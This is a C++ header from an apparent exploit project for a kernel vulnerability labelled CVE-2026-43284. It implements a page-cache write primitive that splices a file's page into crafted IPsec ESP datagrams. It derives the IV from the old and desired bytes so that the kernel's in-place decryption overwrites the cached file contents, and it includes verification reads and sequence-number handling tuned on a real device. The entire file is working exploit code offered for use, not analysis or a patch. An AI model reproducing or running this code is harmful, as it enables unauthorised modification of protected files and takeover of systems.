#pragma once
/** @file backend/cve_2026_43284/seam/pagecache_write.hpp
 *  The page cache window body: the sixteen-byte write, assembled from the pieces the table
 *  classified as belonging here.
 *
 *  What the old write did, in order, and what this does instead: read the sixteen bytes it is about
 *  to replace, derive the initialisation vector from them and the key, assemble the ESP header with
 *  the sequence number, send exactly one datagram, and advance the sequence -- and the advance
 *  happens after the send succeeds, which is the order the old code used and the table confirmed.
 *
 *  Two things are deliberately not this file. The splice face and the read are behind an interface,
 *  because they are the system calls and everything about the shape can be pinned without them. The
 *  integrity check itself is behind the same interface, because computing it needs AES and that
 *  primitive is a port of its own; calling it through a seam keeps the omission visible instead of
 *  letting a zero stand in for a real value.
 *
 *  The sequence starts at one because that is where ESP starts, not because a tuning number was
 *  needed: the table measured that the old value was a code default with no other writer, and a
 *  protocol constant is not a setting.
 */
#include <array>
#include <cstddef>
#include <cstdint>

#include "backend/cve_2026_43284/access_params.hpp"
#include "backend/cve_2026_43284/seam/pagecache_doors.hpp"
#include "backend/cve_2026_43284/seam/pagecache_seam.hpp"

namespace ghostlock::backend::cve_2026_43284::seam {
    /** The block one write deals in, and where the header and the check sit inside it. */
    inline constexpr std::size_t kBlockBytes = 16U;
    /** The bytes before the vector: the SPI and the sequence, each big-endian. */
    inline constexpr std::size_t kHeaderBytes = 8U;
    /** The widest datagram this window builds: the prefix, the widest vector, and the check. */
    inline constexpr std::size_t kMaxDatagramBytes = kHeaderBytes + 2U * kBlockBytes + 2U * kBlockBytes;

    /** The system side of one write. */
    class SpliceOps {
    public:
        SpliceOps() noexcept = default;
        SpliceOps(const SpliceOps &) = delete;
        SpliceOps &operator=(const SpliceOps &) = delete;
        virtual ~SpliceOps() noexcept = default;

        /** 最近一次 splice 失败的原因码（0 表示没有失败）。默认实现给 0，所以测试替身不必实现它，
         *  真实现（RealSpliceIo）会把它自己的失败点写进去 —— 设备上定位就靠这一个数。 */
        [[nodiscard]] virtual int last_error() const noexcept { return 0; }

        /** Read bytes at an offset from the file, or a negative value. */
        [[nodiscard]] virtual long read_at(int fd, std::uint8_t *out, std::size_t size,
                                           std::uint64_t offset) noexcept = 0;
        /** Send one datagram built from the block. */
        [[nodiscard]] virtual bool splice_one(int socket_fd, const std::uint8_t *datagram,
                                              std::size_t size, std::uint64_t offset) noexcept = 0;
        /** The initialisation vector: derived from the old block's content, the block the caller
         *  wants in its place, and the key. The desired block is not optional -- the vector is what
         *  makes the in-place decryption write it. */
        virtual void compute_iv(const std::uint8_t old_block[kBlockBytes],
                                const std::uint8_t desired_block[kBlockBytes],
                                const std::uint8_t key[32],
                                std::uint8_t out[kBlockBytes]) noexcept = 0;
        /** The integrity check over the datagram, truncated to the length the frame states. */
        virtual void compute_icv(const std::uint8_t *datagram, std::size_t size,
                                 const std::uint8_t hmac_key[32], std::uint8_t icv_len,
                                 std::uint8_t *out) noexcept = 0;
        /** Whether this surface can put a block of the carrier into the datagram: from a descriptor
         *  it can open, or through a bridge. A surface that can neither cannot land a block. */
        [[nodiscard]] virtual bool can_serve_page() const noexcept { return false; }
        /** Whether this surface can read a block of the carrier back, which the vector and the
         *  verification both need. */
        [[nodiscard]] virtual bool can_read_page() const noexcept { return false; }
    };

    /** How one block write ended, in the terms the seam reports. */
    enum class WriteOutcome : unsigned char {
        Wrote = 0,
        NotOpen = 1,
        /** The old block could not be read, and the vector depends on it. */
        NoOldBlock = 2,
        /** The datagram was not sent. */
        NotSent = 3,
    };

    /** How one block read ended. Separate from the write outcome because a verification read must
     *  not overwrite the verdict of the write it is verifying. */
    enum class ReadOutcome : unsigned char {
        Read = 0,
        /** The carrier door is not open. */
        NotOpen = 1,
        /** Fewer bytes came back than a block, and a short block is not data. */
        Incomplete = 2,
    };

    class PageCacheWrite final : public PageCacheWindow {
    public:
        PageCacheWrite(DoorOps &doors, SpliceOps &splice, int handed_in_fd = -1) noexcept
            : doors_(doors, handed_in_fd), splice_(splice) {}

        /** 最近一次写的 splice 失败码（转自表面；见 SpliceOps::last_error）。 */
        [[nodiscard]] int last_error() const noexcept { return splice_.last_error(); }

        /** Open the doors with the whole frame, and keep what the write needs from it. */
        [[nodiscard]] bool open_doors(const SaMaterial &sa) noexcept override {
            if (!doors_.open(sa)) {
                return false;
            }
            spi_ = sa.spi;
            icv_len_ = sa.icv_len;
            for (std::size_t i = 0U; i < sizeof(aes_key_); ++i) {
                aes_key_[i] = sa.aes_key[i];
                hmac_key_[i] = sa.hmac_key[i];
            }
            next_seq_ = 1U;
            return true;
        }

        /** Close what was opened and clear the material this kept. */
        void close_doors() noexcept override {
            static_cast<void>(doors_.close());
            zeroize();
        }

        /** One block: read the old one, derive the vector, build, send, then advance. */
        [[nodiscard]] bool write_block(std::uint64_t position,
                                       const std::uint8_t block[kBlockBytes]) noexcept override {
            /* The carrier may have no descriptor of this process's own -- a vendor file opened by
             *  the bridge -- so what matters is that the surface can put its page in the datagram. */
            if (doors_.socket_fd() < 0 || !splice_.can_serve_page()) {
                outcome_ = WriteOutcome::NotOpen;
                return false;
            }
            std::uint8_t old_block[kBlockBytes] = {};
            if (splice_.read_at(doors_.file_fd(), old_block, kBlockBytes, position) !=
                static_cast<long>(kBlockBytes)) {
                /* No vector without the old block, so there is no datagram to send. */
                outcome_ = WriteOutcome::NoOldBlock;
                return false;
            }
            std::uint8_t iv[kBlockBytes] = {};
            /* The block the caller wants is what the vector is derived against: see compute_iv. */
            splice_.compute_iv(old_block, block, aes_key_, iv);
            /* The datagram has the shape the old tree documents, and the length follows from it:
             *  spi(4) | sequence(4) | vector(16) | ciphertext(16) | check(icv_len). The block read
             *  above is the ciphertext already. Everything is assembled before any of it is checked
             *  or sent, because the check covers the whole prefix rather than one field of it. */
            const std::size_t prefix = kHeaderBytes + 2U * kBlockBytes;
            std::array<std::uint8_t, kMaxDatagramBytes> datagram{};
            store_be32(datagram.data(), spi_);
            store_be32(datagram.data() + 4U, next_seq_);
            /* The check covers what the wire will carry, and the wire carries the page's own bytes in
             * the ciphertext slot -- splice_one substitutes them there. Putting the desired block in
             * this slot instead would authenticate bytes nobody sends, and the kernel, which verifies
             * the check before it decrypts, would drop every datagram: found on the device, where the
             * target page never changed. The old tree passed the old block here for the same reason. */
            for (std::size_t i = 0U; i < kBlockBytes; ++i) {
                datagram[kHeaderBytes + i] = iv[i];
                datagram[kHeaderBytes + kBlockBytes + i] = old_block[i];
            }
            splice_.compute_icv(datagram.data(), prefix, hmac_key_, icv_len_,
                                datagram.data() + prefix);
            if (!splice_.splice_one(doors_.socket_fd(), datagram.data(), prefix + icv_len_, position)) {
                outcome_ = WriteOutcome::NotSent;
                return false;
            }
            /* Advanced only after the send succeeded, which is the old order. */
            next_seq_ += 1U;
            outcome_ = WriteOutcome::Wrote;
            return true;
        }

        /** A block read needs a way to the carrier and nothing else: the socket is the write's way
         *  out, and reading the carrier writes nothing. */
        [[nodiscard]] bool can_read() const noexcept override { return splice_.can_read_page(); }

        /** One block read back, through the same surface the write reads the block it replaces
         *  through, so a verification reads the carrier rather than a copy of what was sent. All or
         *  nothing: a short read leaves @p out as it was and names itself, because half a block
         *  compared against a patch is a comparison that must not be believed. */
        [[nodiscard]] bool read_block(std::uint64_t position,
                                      std::uint8_t out[kBlockBytes]) noexcept override {
            if (!splice_.can_read_page()) {
                read_outcome_ = ReadOutcome::NotOpen;
                return false;
            }
            /* Into a local, copied out only for a whole block: a surface that wrote a partial
             *  block straight into the caller's buffer would leave bytes that look like data. */
            std::uint8_t block[kBlockBytes] = {};
            if (splice_.read_at(doors_.file_fd(), block, kBlockBytes, position) !=
                static_cast<long>(kBlockBytes)) {
                read_outcome_ = ReadOutcome::Incomplete;
                return false;
            }
            for (std::size_t i = 0U; i < kBlockBytes; ++i) {
                out[i] = block[i];
            }
            read_outcome_ = ReadOutcome::Read;
            return true;
        }

        /** Continue this window from a sequence another window on the same session reached. Called
         *  through the window interface, which is why it is also declared above as the override. The
         *  sequence belongs to the security association, not to the window: the kernel's inbound
         *  anti-replay window drops anything it has already seen, so a second window that restarted
         *  at one would have every datagram refused -- measured on the device, where the second
         *  carrier's write landed nowhere. The retired tree carried the value between its contexts
         *  for the same reason. */
        void adopt_sequence(std::uint32_t next) noexcept override {
            next_seq_ = next == 0U ? 1U : next;
        }

        [[nodiscard]] WriteOutcome outcome() const noexcept { return outcome_; }
        /** How the last block read ended, which the caller reads after read_block refused. */
        [[nodiscard]] ReadOutcome read_outcome() const noexcept { return read_outcome_; }
        [[nodiscard]] std::uint32_t next_seq() const noexcept { return next_seq_; }
        [[nodiscard]] std::size_t width() const noexcept { return kBlockBytes; }

    private:
        /** Big-endian, as the header is on the wire. */
        static void store_be32(std::uint8_t *out, std::uint32_t value) noexcept {
            out[0] = static_cast<std::uint8_t>((value >> 24U) & 0xffU);
            out[1] = static_cast<std::uint8_t>((value >> 16U) & 0xffU);
            out[2] = static_cast<std::uint8_t>((value >> 8U) & 0xffU);
            out[3] = static_cast<std::uint8_t>(value & 0xffU);
        }

        /** The fields are held rather than the frame, because a parameter set cannot be copied:
         *  its base deletes the copy, which is right for something carrying credentials. */
        void zeroize() noexcept {
            for (std::size_t i = 0U; i < sizeof(aes_key_); ++i) {
                aes_key_[i] = 0U;
                hmac_key_[i] = 0U;
            }
            spi_ = 0U;
            icv_len_ = 0U;
        }

        PageCacheDoors doors_;
        SpliceOps &splice_;
        std::uint32_t spi_ = 0U;
        std::uint8_t icv_len_ = 0U;
        std::uint8_t aes_key_[32] = {};
        std::uint8_t hmac_key_[32] = {};
        std::uint32_t next_seq_ = 1U;
        WriteOutcome outcome_ = WriteOutcome::NotOpen;
        ReadOutcome read_outcome_ = ReadOutcome::NotOpen;
    };
}  // namespace ghostlock::backend::cve_2026_43284::seam
